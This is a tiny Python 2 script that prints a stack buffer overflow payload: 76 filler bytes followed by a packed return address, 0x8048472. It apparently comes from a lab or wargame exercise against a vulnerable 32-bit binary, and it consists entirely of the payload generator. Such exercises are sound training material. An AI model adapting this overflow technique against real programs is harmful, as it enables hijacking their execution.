#!/bin/python

import struct
print('A' * 76 + struct.pack('I', 0x8048472))
